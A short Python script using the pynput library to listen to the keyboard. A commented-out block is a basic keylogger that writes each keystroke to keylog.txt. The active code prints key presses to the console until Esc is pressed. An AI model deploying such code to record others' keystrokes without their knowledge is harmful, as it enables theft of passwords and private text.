# # Import necessary libraries
# from pynput.keyboard import Key, Listener
# import logging

# # Configure basic logging
# logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

# # Define the function to handle key presses
# def on_press(key):
#     logging.info(str(key))

# # Create a listener to capture key strokes
# with Listener(on_press=on_press) as listener:
#     listener.join()
import pynput.keyboard as Keyboard
 
def on_press(key):
    # Callback function whenever a key is pressed
    try:
        print(f'Key {key.char} pressed!')
    except AttributeError:
        print(f'Special Key {key} pressed!')
 
def on_release(key):
    print(f'Key {key} released')
    if key == Keyboard.Key.esc:
        # Stop the listener
        return False
 
with Keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
